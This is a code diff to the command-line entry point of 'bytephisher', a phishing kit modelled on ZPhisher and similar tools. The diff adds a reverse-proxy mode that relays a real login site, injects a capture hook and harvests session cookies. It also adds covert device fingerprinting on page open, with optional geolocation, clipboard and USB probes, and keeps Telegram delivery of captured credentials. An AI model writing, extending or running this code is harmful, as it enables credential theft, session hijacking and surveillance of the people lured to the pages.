@@ -23,6 +23,7 @@ Flags mirror (and extend) PyPhisher/ZPhisher/BlackEye conventions:
 import argparse
 import os
 import sys
+import json
 import time
 import signal
 
@@ -52,9 +53,9 @@ HOME = resolve_home()
 from core import server as srv
 from core import capture as cap
 from core import templates as tpl
-from tunnels import REGISTRY as TUNNEL_REGISTRY, run_one, run_all
+from tunnels import REGISTRY as TUNNEL_REGISTRY, run_one, run_all, reason_for
 
-VERSION = "1.0.4"
+VERSION = "0.1.0"
 TEMPLATES_DIR = os.path.join(HOME, "templates")
 DEFAULT_DB = os.path.join(HOME, "data", "bytephisher.db")
 CONFIG_PATH = os.path.join(HOME, "config", "config.yaml")
@@ -84,9 +85,20 @@ def load_manifest():
     man_path = os.path.join(TEMPLATES_DIR, "templates.json")
     if not os.path.isfile(man_path):
         print("[bytephisher] templates not generated yet — running generator ...")
-        sys.path.insert(0, os.path.join(HOME, "tools"))
-        from gen_templates import main as gen_main
+        # The generator ships with the CODE, not with the data home: with
+        # BYTEPHISHER_HOME pointing at a fresh directory (or a container volume)
+        # there is no tools/ under HOME, so resolve it relative to this file.
+        src_tools = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tools")
+        if os.path.isdir(src_tools) and src_tools not in sys.path:
+            sys.path.insert(0, src_tools)
+        try:
+            from gen_templates import main as gen_main
+        except ImportError as e:
+            raise SystemExit(f"[bytephisher] template generator unavailable: {e}")
         gen_main()
+    if not os.path.isfile(man_path):
+        raise SystemExit(f"[bytephisher] template generation produced no manifest "
+                         f"at {man_path}")
     with open(man_path, encoding="utf-8") as f:
         return json.load(f)
 
@@ -170,6 +182,37 @@ def main():
     ap.add_argument("--reuse", action="store_true",
                     help="show credential-reuse findings (repeated identities/passwords) "
                          "across the database and exit")
+    # ---- reverse-proxy mode (real site proxied live, hook injected) ----
+    ap.add_argument("--proxy", action="store_true",
+                    help="run in reverse-proxy mode: proxy the REAL site and inject "
+                         "the capture hook (needs --phishlet or --upstream)")
+    ap.add_argument("--phishlet", metavar="YAML",
+                    help="phishlet definition file for --proxy")
+    ap.add_argument("--upstream", metavar="HOST[:PORT]",
+                    help="target host to proxy (inline phishlet, no YAML needed)")
+    ap.add_argument("--proxy-scheme", default="https", choices=["http", "https"],
+                    help="scheme used to reach the upstream (default https)")
+    ap.add_argument("--login-path", default="/", help="login path on the upstream")
+    ap.add_argument("--capture-cookies", default="*",
+                    help="cookie names to harvest (comma separated, * = all)")
+    ap.add_argument("--inject-paths", default=".*",
+                    help="regexes of paths that get the hook (comma separated)")
+    ap.add_argument("--block-paths", default="",
+                    help="regexes of paths never touched (comma separated)")
+    ap.add_argument("--no-verify-tls", action="store_true",
+                    help="do not verify the upstream TLS certificate")
+    # ---- deep device intelligence (everything the browser volunteers) ----
+    ap.add_argument("--no-intel", action="store_true",
+                    help="disable the deep device dump collected on page open")
+    ap.add_argument("--intel-perms", action="store_true",
+                    help="also fire permission-gated probes (geolocation, clipboard, "
+                         "notifications, USB/serial/HID) on the first user gesture")
+    ap.add_argument("--intel-dump", metavar="SID|ID|latest",
+                    help="print the full device dump for a session and exit")
+    ap.add_argument("--intel-list", action="store_true",
+                    help="list collected device dumps and exit")
+    ap.add_argument("--intel-export", metavar="PATH",
+                    help="write every device dump to a JSON file and exit")
     ap.add_argument("--no-tui", action="store_true", help="print captures, no live TUI")
     ap.add_argument("--telegram", metavar="TOKEN:CHAT_ID",
                     help="send every capture to a Telegram bot chat")
@@ -187,11 +230,6 @@ def main():
                          "(default: the template slug)")
     ap.add_argument("--qr", metavar="PATH", nargs="?", const="data/qr.png",
                     help="save a QR code PNG of the live link (default data/qr.png)")
-    ap.add_argument("--report", metavar="PATH",
-                    help="write a self-contained HTML campaign report and exit")
-    ap.add_argument("--pdf", metavar="PATH",
-                    help="write a dark-theme PDF campaign report (CONFIRMED/SUSPECTED "
-                         "labels) and exit")
     ap.add_argument("--rotate", metavar="SLUGS",
                     help="serve a random one of these templates per request "
                          "(comma-separated slugs) — A/B style campaigns")
@@ -226,6 +264,46 @@ def main():
     cfg = load_config()
     db = cap.CaptureDB(args.export and cfg["db_path"] or cfg["db_path"])
 
+    if args.intel_dump:
+        from core import intel as _intel
+        rec = db.intel_get(args.intel_dump)
+        if not rec:
+            print(f"[bytephisher] no device dump for '{args.intel_dump}'")
+            return 1
+        print(_intel.dump_text(rec))
+        return 0
+
+    if args.intel_list:
+        rows = db.intel_list(limit=200)
+        if not rows:
+            print("[bytephisher] no device dumps collected yet")
+            return 0
+        print(f"{'id':>5}  {'when':<19}  {'ip':<15}  {'cc':<3}  {'bot':>3}  {'vpn':>3}  "
+              f"{'device token':<34}  browser")
+        print("-" * 120)
+        for r in rows:
+            when = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(r["ts"] or 0))
+            print(f"{r['id']:>5}  {when:<19}  {r['ip']:<15}  {(r['country'] or '')[:3]:<3}  "
+                  f"{r['headless']:>3}  {r['vpn']:>3}  {r['device_token']:<34}  "
+                  f"{(r['ua'] or '')[:40]}")
+        print("-" * 120)
+        print(f"{len(rows)} dump(s). Full detail: --intel-dump <id|sid|latest>")
+        return 0
+
+    if args.intel_export:
+        rows = db.intel_list(limit=100000)
+        out = []
+        for r in rows:
+            rec = db.intel_get(r["id"])
+            if rec:
+                out.append(rec)
+        with open(args.intel_export, "w", encoding="utf-8") as f:
+            json.dump({"exported_at": time.time(), "stats": db.intel_stats(),
+                       "devices": out}, f, indent=2, default=str)
+        print(f"[bytephisher] device dumps exported -> {args.intel_export} "
+              f"({len(out)} records)")
+        return 0
+
     if args.export:
         # extension decides the format: .json -> JSON, anything else -> CSV
         if str(args.export).lower().endswith(".json"):
@@ -235,27 +313,6 @@ def main():
             path = db.export_csv(args.export, campaign=args.campaign)
             print(f"[bytephisher] exported captures (csv) -> {path}")
         print(f"[bytephisher] stats: {db.stats()}")
-        return 0
-
-    if args.report:
-        from tools.report import build_report
-        res = build_report(cfg["db_path"], args.report, campaign=args.campaign,
-                           qr_url=args.qr and args.qr not in ("data/qr.png",) and args.qr or None)
-        print(f"[bytephisher] report written -> {res['path']}")
-        print(f"[bytephisher] rows: {res['rows']}  stats: {res['stats']}")
-        return 0
-
-    if args.pdf:
-        try:
-            from tools.report_pdf import build_report_pdf
-        except ImportError as e:
-            print(f"[bytephisher] PDF needs reportlab+pypdf ({e}). "
-                  f"Install: ./.venv/bin/pip install reportlab pypdf")
-            return 2
-        res = build_report_pdf(cfg["db_path"], args.pdf, campaign=args.campaign,
-                              qr_url=args.qr if args.qr and args.qr != "data/qr.png" else None)
-        print(f"[bytephisher] pdf written -> {res['path']} ({res['pages']} pages, "
-              f"{res['rows']} submissions, {res['stats']['credentials']} credential pairs)")
         return 0
 
     if args.check_update:
@@ -297,14 +354,16 @@ def main():
         from tools import doctor
         return doctor.main(argv=[])
 
-    man = load_manifest()
+    # reverse-proxy mode does not use static templates at all
+    man = [] if args.proxy else load_manifest()
     if args.list:
         print_templates(man)
         return 0
 
     banner(len(man))
 
-    site = resolve_template(man, args.option)
+    site = resolve_template(man, args.option) if not args.proxy else {
+        "slug": args.campaign or "proxy", "name": "reverse-proxy", "dir": "", "index": 0}
     # --rotate: A/B style rotation over several templates, one per request
     rotate_dirs = None
     if args.rotate:
@@ -327,6 +386,8 @@ def main():
     print(f"[bytephisher] geo      : {geo}")
     print(f"[bytephisher] otp page : {'on' if otp else 'off'}")
     print(f"[bytephisher] redirect : {redirect or '(thank-you page)'}")
+    print(f"[bytephisher] intel    : {'full device dump on page open' if not args.no_intel else 'off'}"
+          + (" + permission probes" if args.intel_perms else ""))
 
     # --- optional update notice: cached 24h, background thread, never blocks ---
     upd_repo = args.update_repo or cfg.get("update_repo")
@@ -369,13 +430,40 @@ def main():
         print(f"[bytephisher] alerts   : telegram={'yes' if telegram else 'no'} "
               f"webhook={'yes' if webhook else 'no'}")
 
-    httpd, _Handler = srv.serve(
-        TEMPLATES_DIR, site["dir"], port, cfg["db_path"],
-        geo_provider=geo, redirect_url=redirect, otp=otp,
-        tls=args.tls, cert_path=args.cert,
-        on_capture=notifier, site_name=site["slug"],
-        campaign=args.campaign or site["slug"],
-        rotate_dirs=rotate_dirs, gate=gate, decoy_url=args.decoy or "")
+    if args.proxy:
+        # ---- reverse-proxy mode: real site proxied live, hook injected ----
+        from core.proxy import Phishlet, ProxyEngine, serve_proxy, HOOK_PATH, CAPTURE_PATH
+        if args.phishlet:
+            phishlet = Phishlet.from_yaml(args.phishlet)
+            print(f"[bytephisher] phishlet : {args.phishlet} -> {phishlet.upstream}")
+        elif args.upstream:
+            phishlet = Phishlet(
+                name=args.campaign or args.upstream.split(":")[0],
+                upstream=args.upstream, scheme=args.proxy_scheme,
+                login_path=args.login_path,
+                capture_cookies=[c.strip() for c in args.capture_cookies.split(",") if c.strip()] or ["*"],
+                inject_paths=[p.strip() for p in args.inject_paths.split(",") if p.strip()] or [".*"],
+                block_paths=[p.strip() for p in args.block_paths.split(",") if p.strip()],
+                verify_tls=not args.no_verify_tls,
+                intel_perms=args.intel_perms)
+        else:
+            print("[bytephisher] --proxy needs --phishlet FILE or --upstream HOST — exiting")
+            return 2
+        if gate is not None:
+            print("[bytephisher] WARNING : gating flags are not applied in --proxy mode yet")
+        engine = ProxyEngine(phishlet, db=db, on_capture=notifier, geo_provider=geo)
+        httpd = serve_proxy(engine, port, campaign=args.campaign or phishlet.name)
+        print(f"[bytephisher] mode     : REVERSE PROXY -> {phishlet.base_url}")
+        print(f"[bytephisher] hook     : {HOOK_PATH}   capture: {CAPTURE_PATH}")
+    else:
+        httpd, _Handler = srv.serve(
+            TEMPLATES_DIR, site["dir"], port, cfg["db_path"],
+            geo_provider=geo, redirect_url=redirect, otp=otp,
+            tls=args.tls, cert_path=args.cert,
+            on_capture=notifier, site_name=site["slug"],
+            campaign=args.campaign or site["slug"],
+            rotate_dirs=rotate_dirs, gate=gate, decoy_url=args.decoy or "",
+            intel=not args.no_intel, intel_perms=args.intel_perms)
     # serve_forever() must run in its own thread, otherwise the socket is bound
     # but never accepts connections while the CLI sits in the live-dashboard loop.
     import threading
@@ -403,7 +491,12 @@ def main():
         print("\n[bytephisher] public URLs:")
         live = [u for u in urls.values() if u]
         for name, u in urls.items():
-            print(f"   {name:<14} {u or 'FAILED'}")
+            line = f"   {name:<14} {u or 'FAILED'}"
+            if not u:
+                why = reason_for(name)
+                if why:
+                    line += f"   <- {why}"
+            print(line)
         if not live:
             print("   (none live — falling back to local-only mode)")
         print()
